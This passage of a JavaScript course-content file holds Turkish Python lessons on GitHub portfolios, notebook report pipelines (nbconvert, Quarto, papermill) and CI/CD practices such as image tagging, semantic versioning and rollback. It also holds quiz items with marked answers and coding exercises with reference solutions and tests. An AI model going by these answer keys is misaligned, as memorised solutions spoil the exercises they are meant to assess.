<p>README'nin en üstündeki tek bir grafik ya da uygulama ekran görüntüsü, okuyucunun kalmasını sağlar. Görselleri <code>gorseller/</code> klasörüne koy, göreli yolla bağla (<code>![açıklama](gorseller/x.png)</code>), alternatif metni anlamlı yaz, boyutu küçük tut (genişlik 1200 px civarı, birkaç yüz KB). Etkileşimli bir uygulama ise kısa bir GIF ya da canlı demo bağlantısı (Streamlit Community Cloud, Render, GitHub Pages) çok etkilidir.</p>
<h2>GitHub'da yayın</h2>
<div class="steps-list"><ol>
<li>Gizli bilgi taraması: <code>.env</code>, parola, kişisel veri depoda olmamalı (<code>git log -p | grep -i parola</code>; GitHub secret scanning da uyarır).</li>
<li>Büyük dosya: GitHub 100 MB üstü dosyayı reddeder, 50 MB'ta uyarır. Veriyi depoya koyma; nasıl indirileceğini <code>data/README.md</code>'de anlat ya da Git LFS kullan.</li>
<li>Notebook çıktılarını temizle (<code>nbstripout</code>) ama rapor HTML'ini <code>raporlar/</code>'a koy.</li>
<li><code>gh repo create anadolu-market-analizi --public --source=. --push</code> ya da web arayüzünden depo oluşturup <code>git remote add origin ...</code> + <code>git push -u origin main</code>.</li>
<li>Depo sayfasında "About" kısmına tek cümlelik açıklama ve konular (topics: <code>python</code>, <code>pandas</code>, <code>data-analysis</code>) ekle; profilinde en iyi 4-6 depoyu sabitle (pin).</li>
<li>Rapor HTML'ini GitHub Pages ile yayınla (Settings → Pages → <code>main</code>/<code>docs</code>); README'den bağlantı ver.</li>
</ol></div>
<div class="note"><b>Gerçek işte</b>İşe alımcılar çok sayıda "Titanic" ve "Iris" deposu görür. Seni ayıran; gerçekçi bir iş sorusu, koddan üretilen ve tekrar edilebilen sonuçlar, temiz klasör yapısı, testler ve tek komutla çalışan kurulumdur. Kesit Python, Kesit SQL ve Kesit Power BI'daki aynı veri setleriyle yaptığın SQL, Python ve Power BI analizlerini tek bir portföy hikâyesinde birleştirebilirsin.</div>`,
    ex: [{
        t: 'mc',
        id: 'git-proje-yapisi-y1',
        stage: 'Isınma',
        q: 'Portföy README\'sinin en üstünde (ilk ekranda) ne olmalı?',
        o: ['Kurulum komutlarının adım adım ayrıntılı listesi', 'Tek cümlelik özet, en önemli bulgu ve bir görsel', 'Kullanılan tüm kütüphanelerin sürüm numaralı tablosu', 'Projenin lisans metninin tamamı ve telif bilgisi'],
        a: 1,
        why: 'Okuyucu ilk ekranda "bu ne, neden ilginç?" sorusunun cevabını görmezse devam etmez. Kurulum, teknolojiler ve lisans aşağıda yer alır; lisans metni ayrı LICENSE dosyasında durur.'
      },
    {
        t: 'mc',
        id: 'git-proje-yapisi-y2',
        stage: 'Isınma',
        q: 'Analiz projende 180 MB\'lık ham CSV var. Portföy deposunda en doğru yaklaşım hangisi?',
        o: [
          'CSV\'yi doğrudan commit edip push etmek',
          'Veriyi depoya koymayıp data/README.md\'de kaynağını ve indirme adımını anlatmak',
          'CSV\'yi ZIP\'leyip 100 MB\'ın altına indirip commit etmek',
          'Verinin yalnız ilk 1000 satırını commit edip analizi onunla çalıştırmak'
        ],
        a: 1,
        why: 'GitHub 100 MB üstü dosyaları reddeder; büyük ikili dosyalar depoyu kalıcı olarak şişirir. Kaynak ve indirme betiğiyle tekrar üretilebilirlik sağlanır. Gerçekten sürümlenmesi gereken büyük dosyalar için Git LFS ya da DVC kullanılır.'
      }],
    faq: [
      {
        q: 'Portföyde kaç proje olmalı?',
        a: 'Nicelikten çok nitelik: hedeflediğin role uygun 3-5 iyi proje. Analist için bir SQL + Python analizi ve bir pano; bilimci için uçtan uca bir model (veri → değerlendirme → servis); mühendis için bir veri hattı; backend için testli, dockerize bir API. Her birinde README şablonundaki bölümler eksiksiz olsun.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'jupyter-colab' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'jupyter-colab',
    min: 25,
    needs: ['sqlite3'],
    html: `<p>Derste notebook'u <code>.py</code>'ye ve tek bir HTML'e çevirmeyi, papermill'in ne yaptığını gördün. Bu bölüm o adımları bir <b>rapor hattına</b> dönüştürüyor: kodu gizlenmiş, okunur bir HTML rapor; Quarto ile yayın kalitesinde belge; papermill ile her şehir için ayrı rapor üreten tek bir şablon notebook. Örnek, Anadolu Market'in gerçek sipariş verisinden şehir raporu.</p>
<h2>nbconvert ile yöneticiye uygun HTML</h2>
<p>Yönetici kodu değil sonuçları görmek ister. nbconvert, hücreleri <b>etiketlere</b> (tags) göre süzebilir: JupyterLab'de sağ paneldeki "Property Inspector"dan hücreye <code>remove_input</code> (kodu gizle, çıktıyı göster) ya da <code>remove_cell</code> (tümünü gizle) etiketi verirsin.</p>
<pre class="code">jupyter nbconvert rapor.ipynb --to html --no-input                     # tüm kodları gizle
jupyter nbconvert rapor.ipynb --to html --execute \\
    --TagRemovePreprocessor.remove_input_tags remove_input \\
    --TagRemovePreprocessor.remove_cell_tags remove_cell               # etikete göre
jupyter nbconvert rapor.ipynb --to webpdf --no-input                    # PDF (pip install "nbconvert[webpdf]")</pre>
<p><code>--execute</code> raporu çevirmeden önce notebook'u baştan çalıştırır; böylece HTML'deki sayıların gerçekten o koddan çıktığı garanti olur. Grafikler HTML'in içine gömülür, dosyayı e-postayla göndermek yeter.</p>
<h2>Quarto: notebook'tan belgeye</h2>
<p>Quarto, notebook'ları ve <code>.qmd</code> (Markdown + kod) dosyalarını HTML, PDF, Word ve sunuma çeviren açık kaynaklı bir yayın aracıdır. Ayarlar en baştaki YAML başlığında durur; hücre seçenekleri <code>#|</code> ile başlayan yorumlardır.</p>
<pre class="code">---
title: "İzmir satış raporu"
author: "Analiz ekibi"
format:
  html:
    code-fold: true          # kodu katlanabilir yap
    toc: true
    embed-resources: true    # tek dosya
execute:
  echo: false                # varsayılan: kodu gösterme
---

&#96;&#96;&#96;{python}
#| tags: [parameters]
sehir = "İzmir"
&#96;&#96;&#96;

&#96;&#96;&#96;{python}
#| label: fig-ciro
#| fig-cap: "Yıllara göre teslim edilen ciro"
grafik_ciz(sehir)
&#96;&#96;&#96;</pre>
<pre class="code">quarto render rapor.qmd                              # HTML
quarto render rapor.ipynb --to pdf                   # notebook da doğrudan çevrilir
quarto render rapor.qmd -P sehir:Ankara --output ankara.html   # parametreyle</pre>
<h2>papermill: tek şablon, çok rapor</h2>
<p>papermill, <code>parameters</code> etiketli hücrenin <b>hemen altına</b> "injected-parameters" adlı yeni bir hücre ekleyerek değerleri ezer; şablon notebook'taki varsayılanlar bozulmaz. Çalışan her kopya çıktılarıyla birlikte kaydedilir, böylece hangi raporun hangi parametreyle üretildiği iz bırakır.</p>
<pre class="code">import papermill as pm
for sehir in ["İstanbul", "İzmir", "Ankara"]:
    cikti = f"raporlar/{sehir}.ipynb"
    pm.execute_notebook("sablon.ipynb", cikti, parameters={"sehir": sehir, "yil": 2024})
    # ardından: jupyter nbconvert cikti --to html --no-input</pre>
<p>Şablonun kalbi, parametreye göre çalışan sıradan bir fonksiyondur. Aynı mantığı tarayıcıda çalıştırabilirsin:</p>
<pre class="py">import veri
conn = veri.baglan("anadolu_market", tablolar=["orders", "order_items", "customers"])

def sehir_raporu(sehir):
    sorgu = """
        SELECT substr(o.order_date, 1, 4) AS yil, COUNT(DISTINCT o.order_id),
               ROUND(SUM(oi.quantity * oi.unit_price * (1 - oi.discount)), 2)
        FROM orders o JOIN customers c USING (customer_id) JOIN order_items oi USING (order_id)
        WHERE o.status = 'delivered' AND c.city = ?
        GROUP BY yil ORDER BY yil"""
    return conn.execute(sorgu, (sehir,)).fetchall()

for sehir in ["İzmir", "Ankara"]:          # papermill döngüsünün karşılığı
    print(sehir, sehir_raporu(sehir))</pre>
<div class="tbl-wrap"><table><tr><th>Araç</th><th>Güçlü yanı</th><th>Ne zaman?</th></tr>
<tr><td>nbconvert</td><td>Jupyter ile gelir, hızlı, etiketle süzme</td><td>Ekibe hızlı HTML/PDF</td></tr>
<tr><td>Quarto</td><td>Yayın kalitesi, çapraz referans, web sitesi ve sunum</td><td>Müşteriye rapor, blog, portföy sitesi</td></tr>
<tr><td>papermill</td><td>Parametreli toplu çalıştırma, iz bırakır</td><td>Her şehir/ay için aynı rapor; zamanlanmış raporlar</td></tr></table></div>
<div class="note"><b>Kendi bilgisayarında dene</b><code>pip install nbconvert papermill</code>; Quarto'yu quarto.org'dan kur (Python paketi değil, ayrı bir programdır), sonra <code>quarto check</code>. Tarayıcıda bu araçlar yok; aşağıdaki alıştırmalar notebook JSON'u üzerinde aynı işleri yapıyor.</div>
<div class="note"><b>Gerçek işte</b>Analiz ekiplerinde "her ay başı 12 bölge müdürüne kendi raporu" işi tam olarak papermill + nbconvert (ya da Quarto) ile otomatikleştirilir ve orkestrasyon dersindeki zamanlayıcıya bağlanır. Portföyünde böyle bir hat göstermek, analiz yapabilmenin ötesinde analizi ürünleştirebildiğini kanıtlar.</div>`,
    ex: [{
        t: 'mc',
        id: 'jupyter-colab-y1',
        stage: 'Isınma',
        q: 'Yöneticiye gönderilecek HTML raporda kod hücreleri görünmesin ama grafikler ve tablolar kalsın. Hangisi?',
        o: ['<code>jupyter nbconvert --to script</code>', '<code>jupyter nbconvert --to html --no-input</code>', '<code>jupyter nbconvert --clear-output</code>', '<code>jupyter nbconvert --to markdown</code>'],
        a: 1,
        why: '--no-input kod girdilerini gizler, çıktıları bırakır. --to script yalnız kodu .py\'ye çıkarır; --clear-output tam tersine çıktıları siler; markdown çıktısı kodu da içerir.'
      },
    {
        t: 'mc',
        id: 'jupyter-colab-y2',
        stage: 'Isınma',
        q: 'papermill şablon notebook\'a <code>parameters={"sehir": "Ankara"}</code> verdiğinde ne olur?',
        o: [
          'parameters hücresinin metni değiştirilir ve şablonun üzerine kaydedilir',
          'Altına yeni hücre eklenir, değerler orada ezilir; çıktı ayrı kaydedilir',
          'Tüm hücrelerdeki "sehir" kelimeleri metin olarak Ankara ile değiştirilir',
          'Çekirdekte SEHIR=Ankara ortam değişkeni ayarlanır ve kod onu okur'
        ],
        a: 1,
        why: 'papermill "injected-parameters" hücresini parameters hücresinin hemen ardına ekler; Python sırayla çalıştığı için yeni değer varsayılanı ezer. Şablon değişmez, her çalıştırma ayrı bir çıktı notebook\'u olur.'
      }],
    faq: [
      {
        q: 'Quarto mu, Jupyter Book mu, Streamlit mi?',
        a: 'Statik rapor ve belge için Quarto (tek dosya ya da web sitesi). Çok sayfalı dokümantasyon ya da kitap için Jupyter Book ya da Quarto Book. Kullanıcının filtre seçip etkileşimli inceleyeceği canlı pano için Streamlit/Dash (seaborn-plotly dersindeki panoya geçiş bölümü). Rapor "dondurulmuş" bir sonuçsa statik araç daha basit ve güvenlidir.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'kalite-ci' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'kalite-ci',
    min: 30,
    html: `<p>CI "kod sağlam mı?" sorusunu yanıtlar. Sürekli dağıtım (continuous delivery/deployment, CD) ise bir sonraki soruyu: "Sağlam kod kullanıcıya nasıl, güvenle ve geri alınabilir biçimde ulaşır?" Bu bölüm imaj üretmeyi, ortamları, sürüm etiketlerini, geri almayı ve ML projelerinde model kalite kapısını anlatıyor.</p>
<h2>Teslim mi, dağıtım mı?</h2>
<div class="tbl-wrap"><table><tr><th>Kavram</th><th>Ne olur?</th></tr>
<tr><td>Sürekli entegrasyon (CI)</td><td>Her push'ta lint, tip, test; ana dal hep yeşil</td></tr>
<tr><td>Sürekli teslim (continuous delivery)</td><td>Her yeşil commit yayına <b>hazır</b> bir paket (imaj) üretir; prod'a çıkış bir onay ya da etiketle olur</td></tr>
<tr><td>Sürekli dağıtım (continuous deployment)</td><td>Yeşil commit insan onayı olmadan prod'a çıkar</td></tr></table></div>
<p>Çoğu ekip ortadakini kullanır: <code>main</code>'e her birleşme staging'e otomatik gider; prod'a çıkış bir sürüm etiketi (<code>v1.4.2</code>) ve onayla olur.</p>
<h2>İmajı bir kez inşa et, her yere aynısını taşı</h2>
<p>CD'nin altın kuralı: staging'de test ettiğin <b>aynı imaj</b> prod'a gider; prod için yeniden inşa edilmez. Ortamlar arasında yalnız yapılandırma (ortam değişkenleri, sırlar) değişir. İmaj, kayıt defterine (registry: GitHub Container Registry, Docker Hub, ECR) <b>değiştirilemez</b> bir etiketle gönderilir: commit SHA'sı ya da sürüm numarası. <code>latest</code> yalnız kolaylık etiketidir, dağıtımda kullanılmaz.</p>
<pre class="code"># .github/workflows/cd.yml
name: cd
on:
  push:
    branches: [main]
    tags: ["v*.*.*"]
jobs:
  imaj:
    runs-on: ubuntu-latest
    permissions: {contents: read, packages: write}
    outputs: {etiket: $\{{ steps.meta.outputs.version }}}
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with: {registry: ghcr.io, username: $\{{ github.actor }}, password: $\{{ secrets.GITHUB_TOKEN }}}
      - id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/anadolu/market-api
          tags: |
            type=sha
            type=semver,pattern={{version}}
      - uses: docker/build-push-action@v6
        with: {push: true, tags: $\{{ steps.meta.outputs.tags }}}
  staging:
    needs: imaj
    environment: staging
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh staging $\{{ needs.imaj.outputs.etiket }}
      - run: ./smoke_test.sh https://staging.market.example.com
  prod:
    needs: staging
    if: startsWith(github.ref, 'refs/tags/v')
    environment: production          # GitHub'da "required reviewers" ile onay ister
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh prod $\{{ needs.imaj.outputs.etiket }}</pre>
<p><code>environment:</code> anahtarı GitHub'da ortam başına ayrı sırlar ve koruma kuralları (onaylayıcı, bekleme süresi, yalnız etiketlerden dağıtım) tanımlamanı sağlar. <b>Duman testi</b> (smoke test), dağıtımdan hemen sonra birkaç kritik uç noktayı (<code>/health</code>, giriş, sepet) çağıran kısa bir denetimdir; başarısızsa hat durur.</p>
<h2>Sürüm numarası: anlamsal sürümleme</h2>
<p>Anlamsal sürümleme (semantic versioning) <code>MAJOR.MINOR.PATCH</code> biçimindedir: geriye uyumsuz değişiklik major'ı, yeni özellik minor'ı, hata düzeltmesi patch'i artırır. Commit mesajlarını <i>Conventional Commits</i> kuralıyla (<code>feat:</code>, <code>fix:</code>, <code>feat!:</code>) yazarsan bir sonraki sürümü araçlar (release-please, semantic-release) otomatik hesaplar ve değişiklik günlüğünü (CHANGELOG) üretir.</p>
<h2>Geri alma (rollback)</h2>
<p>Her dağıtım bir gün geri alınacakmış gibi yapılır. Değiştirilemez etiketler sayesinde geri almak, bir önceki <b>başarılı</b> imaj etiketini yeniden dağıtmaktır (<code>kubectl rollout undo</code>, Render/Fly panelinde "redeploy previous"). Geri almayı zorlaştıran tek şey veritabanıdır: yeni sürümün migration'ı eski kodu bozuyorsa geri dönüş de bozulur. Bu yüzden sqlalchemy-orm dersindeki genişlet-daralt kalıbı CD'nin ön koşuludur. Riskli özellikleri <b>özellik bayrağı</b> (feature flag) arkasında yayınlamak, kodu geri almadan özelliği kapatmayı sağlar. Kanarya (canary) dağıtımda yeni sürüm önce trafiğin küçük bir yüzdesine açılır, hata oranı izlenir, sorun yoksa genişletilir.</p>
<div class="warn"><b>"İleri düzelt" her zaman seçenek değildir</b>Prod bozukken hızlı bir düzeltme commit'i yazıp yeniden dağıtmak (fix forward) cazip gelir ama CI süresi kadar kesinti demektir. Önce geri al, kullanıcıyı kurtar, sonra sakin kafayla düzelt.</div>
<h2>ML projelerinde model kalite kapısı</h2>
<p>Model de bir yapıt (artifact) gibi sürümlenir ve dağıtılır; ama "testler geçti" yetmez, yeni model eskisinden <b>kötü</b> olabilir. Kalite kapısı, aday modeli üretimdeki (temel) modelle aynı sabit doğrulama kümesinde karşılaştırır ve kurallardan biri bozulursa dağıtımı durdurur: ana metrik en az temel kadar olmalı, gecikme ve model boyutu sınırı aşmamalı, hiçbir müşteri segmentinde performans belirgin düşmemeli.</p>
<pre class="py">from sklearn.datasets import make_classification
from sklearn.linear_model import LogisticRegression
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import roc_auc_score
from sklearn.model_selection import train_test_split

X, y = make_classification(n_samples=1500, n_features=8, random_state=7)
X_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.3, random_state=7)

temel = LogisticRegression(max_iter=1000).fit(X_tr, y_tr)
aday = DecisionTreeClassifier(max_depth=3, random_state=7).fit(X_tr, y_tr)
auc_t = roc_auc_score(y_te, temel.predict_proba(X_te)[:, 1])
auc_a = roc_auc_score(y_te, aday.predict_proba(X_te)[:, 1])

TOLERANS = 0.005          # gürültü payı
gecti = auc_a &gt;= auc_t - TOLERANS
print(f"temel AUC={auc_t:.3f}  aday AUC={auc_a:.3f}  kapı: {'GEÇTİ' if gecti else 'REDDEDİLDİ'}")</pre>
<p>Bu betik CI'da çalışır ve reddedince <code>sys.exit(1)</code> ile hattı durdurur. Doğrulama kümesi sabit tutulur (sürümlenir); her eğitimde değişirse karşılaştırma anlamsızlaşır. MLflow model kayıt defterinde "Staging → Production" geçişi de bu kapının arkasına konur.</p>
<div class="note"><b>Gerçek işte</b>Olgun ekiplerde prod'a çıkış sıkıcı bir olaydır: günde birkaç kez, küçük değişikliklerle, otomatik duman testi ve tek tıkla geri almayla. Dağıtım sıklığı, değişiklik başarısızlık oranı, geri dönüş süresi ve değişikliğin prod'a ulaşma süresi (DORA metrikleri) bu olgunluğun ölçüsüdür.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'kalite-ci-y1',
        stage: 'Isınma',
        q: 'Staging\'de test edilen sürümü prod\'a çıkarırken doğru yaklaşım hangisi?',
        o: [
          'Prod için kaynak koddan imajı yeniden inşa etmek',
          'Staging\'de test edilen aynı imaj etiketini prod\'a dağıtmak',
          'Prod\'da her zaman <code>latest</code> etiketini çekmek',
          'Prod sunucusunda <code>git pull</code> çalıştırmak'
        ],
        a: 1,
        why: 'Yeniden inşa, farklı bağımlılık sürümleriyle test edilmemiş bir imaj üretebilir. latest değişkendir; hangi sürümün çalıştığı belirsizleşir ve geri alma imkânsızlaşır. Bir kez inşa et, aynı değiştirilemez etiketi her ortama taşı.'
      },
      {
        t: 'mc',
        id: 'kalite-ci-y2',
        stage: 'Isınma',
        q: 'Yeni bir sürüm prod\'a çıktı ve hata oranı aniden yükseldi. Migration\'lar genişlet-daralt kuralına uygun yazılmış. İlk yapılacak şey?',
        o: ['Hatayı bulup düzeltme commit\'i yazmak', 'Bir önceki başarılı imaj etiketine geri dönmek', 'Veritabanını yedekten geri yüklemek', 'Staging ortamını silip yeniden kurmak'],
        a: 1,
        why: 'Önce kullanıcıyı kurtar: geri alma dakikalar sürer, düzeltme ise CI süresi ve riski taşır. Migration\'lar geriye uyumlu olduğu için eski kod yeni şemayla çalışır. Veritabanı geri yükleme veri kaybettirir, son çaredir.'
      },
      {
        t: 'predict',
        id: 'kalite-ci-y3',
        stage: 'Kodu oku',
        q: 'Hangi git referansları prod dağıtımını tetikler? Bu kod ne yazdırır?',
        o: ['[\'v1.4.2\', \'v2.0.0-rc1\']', '[\'v1.4.2\']', '[\'v1.4.2\', \'v1.4\', \'v2.0.0-rc1\']', '[\'main\', \'v1.4.2\', \'v2.0.0-rc1\']'],
        a: 0,
        code: 'from fnmatch import fnmatch\nrefs = ["refs/heads/main", "refs/tags/v1.4.2", "refs/tags/v1.4", "refs/tags/deneme", "refs/tags/v2.0.0-rc1"]\ndesen = "refs/tags/v*.*.*"\nprint([r.rsplit("/", 1)[1] for r in refs if fnmatch(r, desen)])\n',
        why: '* herhangi bir metinle eşleşir; v2.0.0-rc1 de iki nokta içerdiği için desene uyar. Ön sürümlerin (rc) prod\'a gitmesini istemiyorsan iş akışında ayrıca kontrol etmelisin. v1.4\'te iki nokta yok, eşleşmez.'
      },
      {
        t: 'predict',
        id: 'kalite-ci-y4',
        stage: 'Kodu oku',
        q: 'Sürüm karşılaştırması: bu kod ne yazdırır?',
        o: ['1.9.3 1.10.0', '1.10.0 1.10.0', '1.9.3 1.9.3', '1.2.11 1.10.0'],
        a: 0,
        code: 'surumler = ["1.10.0", "1.9.3", "1.2.11"]\nprint(max(surumler), max(surumler, key=lambda s: tuple(map(int, s.split(".")))))\n',
        why: 'Metin karşılaştırması karakter karakter yapılır: "1.9" > "1.1" olduğu için 1.9.3 en büyük görünür. Sayı demetine çevirince (1, 10, 0) > (1, 9, 3) doğru sonucu verir. "Son sürüme geri al" kodunda bu hata yanlış imajı seçtirir.'
      },
      {
        t: 'order',
        id: 'kalite-ci-y5',
        stage: 'Kodu oku',
        q: '<p>Model kalite kapısı betiğinin satırlarını sırala: metrikleri oku, kuralları uygula, ihlal varsa çıkış kodu 1 ile durdur. Beklenen çıktı:</p><pre class="out">REDDEDİLDİ: [\'gecikme_ms 140 &gt; 120\']</pre>',
        lines: [
          'aday = {"auc": 0.84, "gecikme_ms": 140}',
          'kurallar = [("auc", ">=", 0.82), ("gecikme_ms", "<=", 120)]',
          'ihlaller = []',
          'for metrik, op, esik in kurallar:',
          '    if (op == ">=" and aday[metrik] < esik) or (op == "<=" and aday[metrik] > esik):',
          '        ihlaller.append(f"{metrik} {aday[metrik]} {\'<\' if op == \'>=\' else \'>\'} {esik}")',
          'print("REDDEDİLDİ:" if ihlaller else "GEÇTİ", ihlaller)'
        ],
        expect: 'REDDEDİLDİ: [\'gecikme_ms 140 > 120\']\n',
        hint: 'Liste döngüden önce kurulur; ekleme if bloğunun içindedir; özet en sonda yazdırılır.',
        why: 'Kalite kapısı yalnız doğruluğa bakmaz; gecikme ve boyut gibi operasyonel kurallar da aynı listeye girer. Gerçek betik ihlal varsa sys.exit(1) ile CI işini kırmızıya çevirir.'
      },
      {
        t: 'code',
        id: 'kalite-ci-y6',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Conventional Commits\'ten sonraki sürümü hesapla. <code>sonraki_surum(mevcut, mesajlar)</code> yaz: <code>mevcut</code> "1.4.2" gibi bir metin, <code>mesajlar</code> commit başlıklarıdır. Kural: herhangi bir mesajda tür sonrası <code>!</code> (ör. <code>feat!:</code>, <code>fix(api)!:</code>) ya da <code>BREAKING CHANGE</code> varsa major artar (minor ve patch 0); yoksa <code>feat</code> varsa minor artar (patch 0); yoksa <code>fix</code> ya da <code>perf</code> varsa patch artar; hiçbiri yoksa sürüm değişmez.</p>',
        guide: [
          'Sürümü üç tamsayıya ayır.',
          'Her mesajın ":" öncesindeki başlığını al; parantezli kapsamı (scope) atıp türü bul.',
          'En yüksek etki düzeyini bul: 3 major, 2 minor, 1 patch, 0 yok.',
          'Düzeye göre yeni sürümü f-string ile kur.'
        ],
        example: 'import re\nm = re.match(r"(\\w+)(\\([^)]*\\))?(!)?:", "fix(sepet)!: indirim hesabı")\nprint(m.group(1), m.group(2), m.group(3))\n',
        start: 'import re\n\ndef sonraki_surum(mevcut, mesajlar):\n    major, minor, patch = map(int, mevcut.split("."))\n    duzey = 0\n    for m in mesajlar:\n        # TODO: türü ve ! işaretini bul, düzeyi güncelle\n        pass\n    # TODO: düzeye göre yeni sürümü döndür\n    return mevcut\n',
        sol: 'import re\n\ndef sonraki_surum(mevcut, mesajlar):\n    major, minor, patch = map(int, mevcut.split("."))\n    duzey = 0\n    for m in mesajlar:\n        e = re.match(r"(\\w+)(\\([^)]*\\))?(!)?:", m)\n        if "BREAKING CHANGE" in m or (e and e.group(3)):\n            duzey = max(duzey, 3)\n        elif e and e.group(1) == "feat":\n            duzey = max(duzey, 2)\n        elif e and e.group(1) in ("fix", "perf"):\n            duzey = max(duzey, 1)\n    if duzey == 3:\n        return f"{major + 1}.0.0"\n    if duzey == 2:\n        return f"{major}.{minor + 1}.0"\n    if duzey == 1:\n        return f"{major}.{minor}.{patch + 1}"\n    return mevcut\n',
        tests: 'assert sonraki_surum("1.4.2", ["fix: sepette yuvarlama", "docs: README"]) == "1.4.3", "Yalnız fix varsa patch artar"\nassert sonraki_surum("1.4.2", ["fix: x", "feat(odeme): taksit"]) == "1.5.0", "feat minor\'ı artırır ve patch sıfırlanır"\nassert sonraki_surum("1.4.2", ["feat!: v2 uç noktaları", "fix: y"]) == "2.0.0", "! major artırır"\nassert sonraki_surum("1.4.2", ["fix(api)!: alan adı değişti"]) == "2.0.0", "Kapsamlı türde de ! major demektir"\nassert sonraki_surum("1.4.2", ["refactor: temizlik\\n\\nBREAKING CHANGE: eski uç nokta kaldırıldı"]) == "2.0.0", "BREAKING CHANGE gövdede de olabilir"\nassert sonraki_surum("1.4.2", ["chore: bağımlılık", "test: ek"]) == "1.4.2", "Etkisiz türler sürümü değiştirmez"\nassert sonraki_surum("0.9.9", ["perf: önbellek"]) == "0.9.10", "perf patch artırır; sayılar metin gibi değil sayı gibi artar"\n',
        hints: [
          'Etkiyi sayısal düzeyle (0-3) tut ve max ile güncelle; en yüksek etki kazanır.',
          're.match(r"(\\w+)(\\([^)]*\\))?(!)?:", m) türü, kapsamı ve ! işaretini yakalar.',
          'Major artınca minor ve patch, minor artınca patch sıfırlanır.'
        ],
        why: 'release-please ve semantic-release bu mantıkla çalışır. Sürüm numarası insan kararı olmaktan çıkınca etiket ve CHANGELOG otomatik üretilir; kullanıcılar da numaraya bakarak yükseltmenin güvenli olup olmadığını anlar.'
      },
      {
        t: 'code',
        id: 'kalite-ci-y7',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p><code>imaj_etiketleri(imaj, sha, ref)</code> yaz (docker/metadata-action benzeri). Her zaman <code>imaj:sha-&lt;ilk 7 karakter&gt;</code> üret. <code>ref</code> <code>refs/heads/main</code> ise ek olarak <code>imaj:main</code>. <code>ref</code> <code>refs/tags/vX.Y.Z</code> ise (yalnız sayılardan oluşan üç parça) ek olarak <code>imaj:X.Y.Z</code>, <code>imaj:X.Y</code> ve <code>imaj:latest</code>. Diğer referanslarda (başka dal, ön sürüm etiketi) yalnız sha etiketi. Etiketleri bu sırayla liste olarak döndür.</p>',
        start: 'def imaj_etiketleri(imaj, sha, ref):\n    pass\n',
        sol: 'import re\n\ndef imaj_etiketleri(imaj, sha, ref):\n    etiketler = [f"{imaj}:sha-{sha[:7]}"]\n    if ref == "refs/heads/main":\n        etiketler.append(f"{imaj}:main")\n    m = re.fullmatch(r"refs/tags/v(\\d+)\\.(\\d+)\\.(\\d+)", ref)\n    if m:\n        x, y, z = m.groups()\n        etiketler += [f"{imaj}:{x}.{y}.{z}", f"{imaj}:{x}.{y}", f"{imaj}:latest"]\n    return etiketler\n',
        tests: 'I = "ghcr.io/anadolu/market-api"\nS = "3f9c2a1b7d4e5f60"\nassert imaj_etiketleri(I, S, "refs/heads/main") == [I + ":sha-3f9c2a1", I + ":main"], "main dalı: sha ve main"\nassert imaj_etiketleri(I, S, "refs/tags/v1.4.2") == [I + ":sha-3f9c2a1", I + ":1.4.2", I + ":1.4", I + ":latest"], "Sürüm etiketi: tam, kısa ve latest"\nassert imaj_etiketleri(I, S, "refs/tags/v2.0.0-rc1") == [I + ":sha-3f9c2a1"], "Ön sürüm latest almamalı"\nassert imaj_etiketleri(I, S, "refs/heads/ozellik/sepet") == [I + ":sha-3f9c2a1"], "Diğer dallar yalnız sha etiketi alır"\n',
        hints: ['sha etiketi her durumda ilk eleman.', 'Sürüm etiketi için re.fullmatch ile tam eşleşme kullan; -rc1 gibi ekler eşleşmemeli.', 'X.Y etiketi, kullanıcıların "1.4 serisinin son yaması"nı çekmesini sağlar.'],
        why: 'sha etiketi her commit\'i izlenebilir kılar ve geri almanın dayanağıdır. latest yalnız kararlı sürümlere verilir; ön sürüme latest vermek, latest çeken herkesi test edilmemiş koda taşır.'
      },
      {
        t: 'code',
        id: 'kalite-ci-y8',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p><code>geri_alma_hedefi(gecmis)</code> yaz. <code>gecmis</code> dağıtım kayıtlarının eski→yeni sıralı listesidir: <code>{"etiket": "1.4.2", "durum": "basarili" | "basarisiz" | "geri_alindi"}</code>. Son kayıt şu an çalışan (sorunlu) sürümdür. Ondan önceki, durumu <code>"basarili"</code> olan ve etiketi şu ankinden <b>farklı</b> en yakın kaydın etiketini döndür; yoksa <code>None</code>.</p>',
        start: 'def geri_alma_hedefi(gecmis):\n    pass\n',
        sol: 'def geri_alma_hedefi(gecmis):\n    if not gecmis:\n        return None\n    simdiki = gecmis[-1]["etiket"]\n    for kayit in reversed(gecmis[:-1]):\n        if kayit["durum"] == "basarili" and kayit["etiket"] != simdiki:\n            return kayit["etiket"]\n    return None\n',
        tests: 'G = [{"etiket": "1.3.0", "durum": "basarili"}, {"etiket": "1.4.0", "durum": "basarili"},\n     {"etiket": "1.4.1", "durum": "basarisiz"}, {"etiket": "1.4.2", "durum": "basarili"}]\nassert geri_alma_hedefi(G) == "1.4.0", "Başarısız 1.4.1 atlanmalı; en yakın başarılı 1.4.0"\nG2 = [{"etiket": "1.3.0", "durum": "basarili"}, {"etiket": "1.4.0", "durum": "basarili"}, {"etiket": "1.4.0", "durum": "basarili"}]\nassert geri_alma_hedefi(G2) == "1.3.0", "Aynı etiketin yeniden dağıtımı geri alma hedefi olamaz"\nG3 = [{"etiket": "1.2.0", "durum": "basarili"}, {"etiket": "1.3.0", "durum": "geri_alindi"}, {"etiket": "1.4.0", "durum": "basarili"}]\nassert geri_alma_hedefi(G3) == "1.2.0", "Daha önce geri alınmış sürüme dönülmez"\nassert geri_alma_hedefi([{"etiket": "1.0.0", "durum": "basarili"}]) is None, "Tek kayıtta dönülecek sürüm yok"\nassert geri_alma_hedefi([]) is None, "Boş geçmişte None"\n',
